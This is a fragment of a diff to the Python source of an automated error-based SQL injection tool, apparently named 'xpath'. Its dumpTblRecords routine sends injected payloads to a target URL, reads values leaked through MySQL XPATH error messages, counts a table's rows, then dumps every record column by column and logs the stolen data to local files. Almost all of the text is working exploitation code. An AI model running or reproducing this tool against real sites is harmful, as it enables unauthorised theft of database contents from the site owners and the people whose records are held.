-                            except (IOError, httplib.HTTPException) as e:
-                                ConnTimeOut()
-                                pass
-                            except KeyboardInterrupt:
-                                KeyBoardInterrupt()
-                                break
-                            else:
                                 try:
-                                    respdata = resp.read()
-                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                    if 'XPATH syntax error' in respdata:
-                                        vul = True
-                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
-                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                        print fw + sn + 'Parameter: (GET)'
-                                        infos += 'Parameter: (GET)\n'
-                                        print fw + sn + '\tType: error-based'
-                                        infos += '\tType: error-based\n'
-                                        print fw + sn + '\tTitle: %s' % test
-                                        infos += '\tTitle: %s\n' % test
-                                        print fw + sn + '\tPayload: %s' % tgt
-                                        infos += '\tPayload: %s\n' % tgt
-                                        # ----------------------------------------
-                                        # for later usage of dumiping other things
-                                        CreatePayloadFile()
-                                        with open(payload,'w') as ft:
-                                            ft.write('%s' % tgt)
-                                            ft.close()
-                                        # ----------------------------------------
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                except IndexError as e:
+                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
+                                    req = Request(url, data=tgt, headers={'User-agent':ua})
+                                    HTTPReqCount += 1
+                                    resp = urlopen(req, timeout=10)
+                                except URLError as e:
+                                    URLError()
+                                    sleep(1)
                                     pass
-                                except Exception as e:
+                                except HTTPError as e:
+    ##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                    sleep(1)
+                                    pass
+                                except (IOError, httplib.HTTPException) as e:
+                                    ConnTimeOut()
                                     pass
                                 except KeyboardInterrupt:
                                     KeyBoardInterrupt()
                                     break
                                 else:
-                                    Query_Test = False
-                                    if wsr and war:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                                        infos += "web server technology: %s, %s\n" % (war, wsr)
-                                    else:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                                        infos += "web server technology: %s\n" % wsr
-                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-                                    infos += "the back-end DBMS: MySQL\n"
-                                    out = ', '.join(map(str,ColumnList))
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
-                                    for QueryIndex in REC_COUNT_FROM_TBL:
-                                        if not Query_Test:
-                                            QueryToTest = QueryIndex % (db,tbl)
-                                            if '0x72306f74' in tgt:
-                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
-                                                    try:
-                                                        respdata = resp.read()
-                                                        no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            Query_Test = True
-                                                            if '0' in no_of_recs:
-                                                                print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
-                                                                break
-                                                            else:
-                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
-                                                                dbvul = False
-                                                                for QueryIndex in REC_DUMP_FROM_TBL:
-                                                                    if not dbvul:
-                                                                        QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
-                                                                        if '0x72306f74' in tgt:
-                                                                            FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
-                                                                            try:
-                                                                                req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
-                                                                                resp = urlopen(req, timeout=10)
-                                                                            except URLError as e:
-                                                                                URLError()
-                                                                                sleep(1)
-                                                                                pass
-                                                                            except HTTPError as e:
-    ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                                sleep(1)
-                                                                                pass
-                                                                            except (IOError, httplib.HTTPException) as e:
-                                                                                ConnTimeOut()
-                                                                                pass
-                                                                            except KeyboardInterrupt:
-                                                                                KeyBoardInterrupt()
-                                                                                break
-                                                                            else:
-                                                                                try:
-                                                                                    respdata = resp.read()
-                                                                                    isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                    if 'XPATH syntax error' in respdata:
-                                                                                        dbvul = True
-                                                                                        if '%20' in FinalDumpQuery_replaced:
-                                                                                            testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
-                                                                                        else:
-                                                                                            testQuery = FinalDumpQuery_replaced
-                                                                                        
-                                                                                        if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
-                                                                                            DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')
-
-                                                                                        elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
-                                                                                            DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
-                                                                                            
-                                                                                        else:
-                                                                                            pass
-                                                                                        
-                                                                                        temp = 0
-                                                                                        nor = int(no_of_recs)
-                                                                                        infos += "Database: %s\n" % db
-                                                                                        infos += "Table: %s\n" % tbl
-                                                                                        infos += "["+str(nor)+" recs]\n"
-                                                                                        tmp = ""
-                                                                                        while temp < nor:
-                                                                                            t = 0
-                                                                                            for columns in ColumnList:
-                                                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                                                elif 'LIMIT%%20' in DbDumpQuery:
-                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
-                                                                                                else:
-                                                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-                                                                                                    
-                                                                                                if 'LIMIT%20' in tempQuery:
-                                                                                                    tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
-                                                                                                else:
-                                                                                                    tempQuery = tempQuery
-                                                                                                    
-                                                                                                RecordsnumpQuery = tempQuery % (columns)
-                                                                                                try:
-                                                                                                    req = Request(url, data=RecordsnumpQuery, headers={'User-agent':ua})
-                                                                                                    resp = urlopen(req, timeout=30)
-                                                                                                except URLError as e:
-                                                                                                    URLError()
-                                                                                                    if temp == 0:
-                                                                                                        temp = 0
-                                                                                                    else:
-                                                                                                        temp = temp
-                                                                                                    sleep(1)
-                                                                                                    pass
-                                                                                                except HTTPError as e:
-    ##                                                                                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                                                    sleep(1)
-                                                                                                    pass
-                                                                                                except (IOError, httplib.HTTPException) as e:
-                                                                                                    ConnTimeOut()
-                                                                                                    if temp == 0:
-                                                                                                        temp = 0
-                                                                                                    else:
-                                                                                                        temp = temp
-                                                                                                    pass
-                                                                                                except KeyboardInterrupt:
-                                                                                            
-                                                                                                    print fw + sn + "Database: %s" % db
-                                                                                                    print fw + sn + "Table: %s" % tbl
-                                                                                                    print fw + sn + "[Dumped "+str(temp)+" records]:"
-                                                                                                    print fw + sn + tmp
-                                                                                                    fd.write(dumps)
-                                                                                                    fd.close()
-                                                                                                    f.write(infos)
-                                                                                                    f.close()
-                                                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-                                                                                                    KeyBoardInterrupt()
-                                                                                                    break
-                                                                                                else:
-                                                                                                    try:
-                                                                                                        respdata = resp.read()
-                                                                                                        records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                                        if 'XPATH syntax error' in respdata:
-                                                                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
-                                                                                                            infos += "[*] %s\n" % records
-                                                                                                            dumps += "{},".format(records)
-                                                                                                            tmp += "[*] %s\n" % records
-                                                                                                            t += 1
-                                                                                                            
-                                                                                                    except IndexError as e:
-                                                                                                        pass
-                                                                                                    except Exception as e:
-                                                                                                        pass
-                                                                                                    except KeyboardInterrupt:
-                                                                                                        KeyBoardInterrupt()
-                                                                                                        break  
-                                                                                            check = len(ColumnList)
-                                                                                            if t == check:
-                                                                                                dumps += "\n"
-                                                                                                temp += 1
-                                                                                            else:
-                                                                                                pass
-
-                                                                                        print fg + sb + "Database: %s" % db
-                                                                                        print fg + sb + "Table: %s" % tbl
-                                                                                        print fg + sb + "["+str(nor)+" records]"
-                                                                                        print fg + sb + tmp
-                                                                                            
-                                                                                except IndexError as e:
-                                                                                    pass
-                                                                                except Exception as e:
-                                                                                    pass
-                                                                                except KeyboardInterrupt:
-                                                                                    KeyBoardInterrupt()
-                                                                                    break
-                                                                    if dbvul:
-                                                                        break
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if Query_Test:
-                                            break            
-                        if vul:
-                            break
-                    except (TypeError, IOError, IndexError):
-                        pass
-                    except KeyboardInterrupt:
-                        KeyBoardInterrupt()
-                        break
-                    
-            f.write(infos)
-            fd.write(dumps)
-            fd.close()
-            f.close()
-            
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-            
-        else:
-            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
-            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
-            with open(logs, "r") as prev_session:
-                for line in islice(prev_session,1,7):
-                    out = line.rstrip()
-                    if out:
-                        print fw + sn + out
-                        infos += out+"\n"
-            prev_session.close()
-            HTTPResponses(url, data)
-            Query_Test = False
-            tempfread = tempf.readline()
-            if wsr and war:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                infos += "web server technology: %s, %s\n" % (war, wsr)
-            else:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                infos += "web server technology: %s\n" % wsr
-            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-            infos += "the back-end DBMS: MySQL\n"
-            out = ', '.join(map(str,ColumnList))
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
-            for QueryIndex in REC_COUNT_FROM_TBL:
-                if not Query_Test:
-                    QueryToTest = QueryIndex % (db,tbl)
-                    if '0x72306f74' in tempfread:
-                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                        try:
-                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
-                            resp = urlopen(req, timeout=10)
-                        except URLError as e:
-                            URLError()
-                            sleep(1)
-                            pass
-                        except HTTPError as e:
-##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                            sleep(1)
-                            pass
-                        except (IOError, httplib.HTTPException) as e:
-                            ConnTimeOut()
-                            pass
-                        except KeyboardInterrupt:
-                            KeyBoardInterrupt()
-                            break
-                        else:
-                            try:
-                                respdata = resp.read()
-                                no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                if 'XPATH syntax error' in respdata:
-                                    Query_Test = True
-                                    if '0' in no_of_recs:
-                                        print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                    try:
+                                        respdata = resp.read()
+                                        retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                        if 'XPATH syntax error' in respdata:
+                                            vul = True
+                                            print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
+                                            infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                            print fw + sn + 'Parameter: (GET)'
+                                            infos += 'Parameter: (GET)\n'
+                                            print fw + sn + '\tType: error-based'
+                                            infos += '\tType: error-based\n'
+                                            print fw + sn + '\tTitle: %s' % test
+                                            infos += '\tTitle: %s\n' % test
+                                            print fw + sn + '\tPayload: %s' % tgt
+                                            infos += '\tPayload: %s\n' % tgt
+                                            # ----------------------------------------
+                                            # for later usage of dumiping other things
+                                            CreatePayloadFile()
+                                            with open(payload,'w') as ft:
+                                                ft.write('%s' % tgt)
+                                                ft.close()
+                                            # ----------------------------------------
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                    except IndexError as e:
+                                        pass
+                                    except Exception as e:
+                                        pass
+                                    except KeyboardInterrupt:
+                                        KeyBoardInterrupt()
                                         break
                                     else:
-                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
-                                        dbvul = False
-                                        for QueryIndex in REC_DUMP_FROM_TBL:
-                                            if not dbvul:
-                                                QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
-                                                if '0x72306f74' in tempfread:
-                                                    FinalDumpQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
+                                        Query_Test = False
+                                        if wsr and war:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                                            infos += "web server technology: %s, %s\n" % (war, wsr)
+                                        else:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                                            infos += "web server technology: %s\n" % wsr
+                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                                        infos += "the back-end DBMS: MySQL\n"
+                                        out = ', '.join(map(str,ColumnList))
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
+                                        for QueryIndex in REC_COUNT_FROM_TBL:
+                                            if not Query_Test:
+                                                QueryToTest = QueryIndex % (db,tbl)
+                                                if '0x72306f74' in tgt:
+                                                    FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                     try:
-                                                        req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                        req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                         resp = urlopen(req, timeout=10)
                                                     except URLError as e:
                                                         URLError()
@@ -5625,110 +5456,153 @@ def dumpTblRecords(url, data, db, tbl, col):
                                                     else:
                                                         try:
                                                             respdata = resp.read()
-                                                            isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                             if 'XPATH syntax error' in respdata:
-                                                                dbvul = True
-                                                                if '%20' in FinalDumpQuery_replaced:
-                                                                    testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
+                                                                Query_Test = True
+                                                                if '0' in no_of_recs:
+                                                                    print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                                                    break
                                                                 else:
-                                                                    testQuery = FinalDumpQuery_replaced
-                                                                
-                                                                if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
-                                                                    DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')
+                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                                                    dbvul = False
+                                                                    for QueryIndex in REC_DUMP_FROM_TBL:
+                                                                        if not dbvul:
+                                                                            QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
+                                                                            if '0x72306f74' in tgt:
+                                                                                FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                                                try:
+                                                                                    req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                                                    resp = urlopen(req, timeout=10)
+                                                                                except URLError as e:
+                                                                                    URLError()
+                                                                                    sleep(1)
+                                                                                    pass
+                                                                                except HTTPError as e:
+        ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                    sleep(1)
+                                                                                    pass
+                                                                                except (IOError, httplib.HTTPException) as e:
+                                                                                    ConnTimeOut()
+                                                                                    pass
+                                                                                except KeyboardInterrupt:
+                                                                                    KeyBoardInterrupt()
+                                                                                    break
+                                                                                else:
+                                                                                    try:
+                                                                                        respdata = resp.read()
+                                                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                        if 'XPATH syntax error' in respdata:
+                                                                                            dbvul = True
+                                                                                            if '%20' in FinalDumpQuery_replaced:
+                                                                                                testQuery = FinalDumpQuery_replaced.replace('%20','%%20')  
+                                                                                            else:
+                                                                                                testQuery = FinalDumpQuery_replaced
+                                                                                            
+                                                                                            if 'CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)' in testQuery:
+                                                                                                DbDumpQuery = testQuery.replace('CONCAT/**_**/(/*!50000'+str(ColumnList[0])+'*/)','CONCAT/**_**/(/*!50000%s*/)')
 
-                                                                elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
-                                                                    DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
-                                                                    
-                                                                else:
-                                                                    pass
-                                                                
-                                                                temp = 0
-                                                                nor = int(no_of_recs)
-                                                                infos += "Database: %s\n" % db
-                                                                infos += "Table: %s\n" % tbl
-                                                                infos += "["+str(nor)+" recs]\n"
-                                                                tmp = ""
-                                                                while temp < nor:
-                                                                    t = 0
-                                                                    for columns in ColumnList:
-                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                        elif 'LIMIT%%20' in DbDumpQuery:
-                                                                            tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
-                                                                        else:
-                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-                                                                            
-                                                                        if 'LIMIT%20' in tempQuery:
-                                                                            tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
-                                                                        else:
-                                                                            tempQuery = tempQuery
-                                                                            
-                                                                        RecordsnumpQuery = tempQuery % (columns)
-                                                                        try:
-                                                                            req = Request(url, data=RecordsnumpQuery, headers={'User-agent':ua})
-                                                                            resp = urlopen(req, timeout=30)
-                                                                        except URLError as e:
-                                                                            URLError()
-                                                                            if temp == 0:
-                                                                                temp = 0
-                                                                            else:
-                                                                                temp = temp
-                                                                            sleep(1)
-                                                                            pass
-                                                                        except HTTPError as e:
-    ##                                                                        print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                            sleep(1)
-                                                                            pass
-                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                            ConnTimeOut()
-                                                                            if temp == 0:
-                                                                                temp = 0
-                                                                            else:
-                                                                                temp = temp
-                                                                            pass
-                                                                        except KeyboardInterrupt:
-                                                                            print fw + sn + "Database: %s" % db
-                                                                            print fw + sn + "Table: %s" % tbl
-                                                                            print fw + sn + "["+str(temp)+" records]:"
-                                                                            print fw + sn + tmp
-                                                                            fd.write(dumps)
-                                                                            fd.close()
-                                                                            f.write(infos)
-                                                                            f.close()
-                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
-                                                                            KeyBoardInterrupt()
+                                                                                            elif 'CONCAT('+str(ColumnList[0])+')' in testQuery:
+                                                                                                DbDumpQuery = testQuery.replace('CONCAT('+str(ColumnList[0])+')','CONCAT(%s)')
+                                                                                                
+                                                                                            else:
+                                                                                                pass
+                                                                                            
+                                                                                            temp = 0
+                                                                                            nor = int(no_of_recs)
+                                                                                            infos += "Database: %s\n" % db
+                                                                                            infos += "Table: %s\n" % tbl
+                                                                                            infos += "["+str(nor)+" recs]\n"
+                                                                                            tmp = ""
+                                                                                            while temp < nor:
+                                                                                                t = 0
+                                                                                                for columns in ColumnList:
+                                                                                                    if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                                                        tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                                                    elif 'LIMIT%%20' in DbDumpQuery:
+                                                                                                        tempQuery = DbDumpQuery.replace('LIMIT%%200','LIMIT%%20%d' % temp)
+                                                                                                    else:
+                                                                                                        tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                                                        
+                                                                                                    if 'LIMIT%20' in tempQuery:
+                                                                                                        tempQuery = tempQuery.replace('LIMIT%20','LIMIT%%20')
+                                                                                                    else:
+                                                                                                        tempQuery = tempQuery
+                                                                                                        
+                                                                                                    RecordsnumpQuery = tempQuery % (columns)
+                                                                                                    try:
+                                                                                                        req = Request(url, data=RecordsnumpQuery, headers={'User-agent':ua})
+                                                                                                        resp = urlopen(req, timeout=30)
+                                                                                                    except URLError as e:
+                                                                                                        URLError()
+                                                                                                        if temp == 0:
+                                                                                                            temp = 0
+                                                                                                        else:
+                                                                                                            temp = temp
+                                                                                                        sleep(1)
+                                                                                                        pass
+                                                                                                    except HTTPError as e:
+        ##                                                                                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                                        sleep(1)
+                                                                                                        pass
+                                                                                                    except (IOError, httplib.HTTPException) as e:
+                                                                                                        ConnTimeOut()
+                                                                                                        if temp == 0:
+                                                                                                            temp = 0
+                                                                                                        else:
+                                                                                                            temp = temp
+                                                                                                        pass
+                                                                                                    except KeyboardInterrupt:
+                                                                                                
+                                                                                                        print fw + sn + "Database: %s" % db
+                                                                                                        print fw + sn + "Table: %s" % tbl
+                                                                                                        print fw + sn + "[Dumped "+str(temp)+" records]:"
+                                                                                                        print fw + sn + tmp
+                                                                                                        fd.write(dumps)
+                                                                                                        fd.close()
+                                                                                                        f.write(infos)
+                                                                                                        f.close()
+                                                                                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                                                                                                        KeyBoardInterrupt()
+                                                                                                        break
+                                                                                                    else:
+                                                                                                        try:
+                                                                                                            respdata = resp.read()
+                                                                                                            records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                                            if 'XPATH syntax error' in respdata:
+                                                                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
+                                                                                                                infos += "[*] %s\n" % records
+                                                                                                                dumps += "{},".format(records)
+                                                                                                                tmp += "[*] %s\n" % records
+                                                                                                                t += 1
+                                                                                                                
+                                                                                                        except IndexError as e:
+                                                                                                            pass
+                                                                                                        except Exception as e:
+                                                                                                            pass
+                                                                                                        except KeyboardInterrupt:
+                                                                                                            KeyBoardInterrupt()
+                                                                                                            break  
+                                                                                                check = len(ColumnList)
+                                                                                                if t == check:
+                                                                                                    dumps += "\n"
+                                                                                                    temp += 1
+                                                                                                else:
+                                                                                                    pass
+
+                                                                                            print fg + sb + "Database: %s" % db
+                                                                                            print fg + sb + "Table: %s" % tbl
+                                                                                            print fg + sb + "["+str(nor)+" records]"
+                                                                                            print fg + sb + tmp
+                                                                                                
+                                                                                    except IndexError as e:
+                                                                                        pass
+                                                                                    except Exception as e:
+                                                                                        pass
+                                                                                    except KeyboardInterrupt:
+                                                                                        KeyBoardInterrupt()
+                                                                                        break
+                                                                        if dbvul:
                                                                             break
-                                                                        else:
-                                                                            try:
-                                                                                respdata = resp.read()
-                                                                                records = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                if 'XPATH syntax error' in respdata:
-                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % records
-                                                                                    infos += "[*] %s\n" % records
-                                                                                    dumps += "{},".format(records)
-                                                                                    tmp += "[*] %s\n" % records
-                                                                                    t += 1
-                                                                                    
-                                                                            except IndexError as e:
-                                                                                pass
-                                                                            except Exception as e:
-                                                                                pass
-                                                                            except KeyboardInterrupt:
-                                                                               
-                                                                                KeyBoardInterrupt()
-                                                                                break  
-                                                                    check = len(ColumnList)
-                                                                    if t == check:
-                                                                        dumps += "\n"
-                                                                        temp += 1
-                                                                    else:
-                                                                        pass
-
-                                                                print fw + sn + "Database: %s" % db
-                                                                print fw + sn + "Table: %s" % tbl
-                                                                print fw + sn + "["+str(nor)+" records]"
-                                                                print fw + sn + tmp
-                                                                    
                                                         except IndexError as e:
                                                             pass
                                                         except Exception as e:
@@ -5736,23 +5610,239 @@ def dumpTblRecords(url, data, db, tbl, col):
                                                         except KeyboardInterrupt:
                                                             KeyBoardInterrupt()
                                                             break
-                                            if dbvul:
-                                                break
-                            except IndexError as e:
+                                            if Query_Test:
+                                                break            
+                            if vul:
+                                break
+                        except (TypeError, IOError, IndexError):
+                            pass
+                        except KeyboardInterrupt:
+                            KeyBoardInterrupt()
+                            break
+                        
+                f.write(infos)
+                fd.write(dumps)
+                fd.close()
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                pass
+            
+        else:
+            try:
+                print fw + sn + "xpath resumed the following injection point(s) from stored session:"
+                infos += "\nxpath resumed the following injection point(s) from stored session:\n"
+                with open(logs, "r") as prev_session:
+                    for line in islice(prev_session,1,7):
+                        out = line.rstrip()
+                        if out:
+                            print fw + sn + out
+                            infos += out+"\n"
+                prev_session.close()
+                HTTPResponses(url, data)
+                Query_Test = False
+                tempfread = tempf.readline()
+                if wsr and war:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                    infos += "web server technology: %s, %s\n" % (war, wsr)
+                else:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                    infos += "web server technology: %s\n" % wsr
+                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                infos += "the back-end DBMS: MySQL\n"
+                out = ', '.join(map(str,ColumnList))
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching entries of column(s) '%s' for table '%s' in database '%s'" % (out,tbl, db)
+                for QueryIndex in REC_COUNT_FROM_TBL:
+                    if not Query_Test:
+                        QueryToTest = QueryIndex % (db,tbl)
+                        if '0x72306f74' in tempfread:
+                            FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
+                            try:
+                                req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
+                                resp = urlopen(req, timeout=10)
+                            except URLError as e:
+                                URLError()
+                                sleep(1)
                                 pass
-                            except Exception as e:
+                            except HTTPError as e:
+    ##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                sleep(1)
+                                pass
+                            except (IOError, httplib.HTTPException) as e:
+                                ConnTimeOut()
                                 pass
                             except KeyboardInterrupt:
                                 KeyBoardInterrupt()
                                 break
-                if Query_Test:
-                    break
-            
-            f.write(infos)
-            fd.write(dumps)
-            fd.close()
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % PathToDumpedDb
+                            else:
+                                try:
+                                    respdata = resp.read()
+                                    no_of_recs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                    if 'XPATH syntax error' in respdata:
+                                        Query_Test = True
+                                        if '0' in no_of_recs:
+                                            print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                            break
+                                        else:
+                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_recs
+                                            dbvul = False
+                                            for QueryIndex in REC_DUMP_FROM_TBL:
+                                                if not dbvul:
+                                                    QueryToTest = QueryIndex % (ColumnList[0],db,tbl)
+                                                    if '0x72306f74' in tempfread:
+                                                        FinalDumpQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
+                                                        try:
+                                                            req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
+                                                            resp = urlopen(req, timeout=10)
+                                                        except URLError as e:
+                                                            URLError()
+                                                            sleep(1)
+                                                            pass
+                                                        except HTTPError as e:
+        ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                            sleep(1)
+                                                            pass
+                                                        except (IOError, httplib.HTTPException) as e:
